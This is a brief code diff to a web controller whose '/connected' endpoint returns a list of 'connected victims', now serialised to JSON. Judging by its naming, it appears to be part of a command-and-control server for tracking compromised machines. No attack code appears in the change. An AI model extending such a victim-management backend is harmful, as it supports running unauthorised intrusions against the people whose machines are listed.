@@ -13,9 +13,11 @@ export class HelloWorldController {
 
     @Get('/connected')
     public async listConnected(): Promise<IArrayResponse<VictimModel>> {
+        const victims = await this.victimService.listConnected();
+
         return {
             message: "Successfully retrieved connected victims' list.",
-            data: await this.victimService.listConnected(),
+            data: victims.map((victim) => victim.toJSON()),
         };
     }
 }
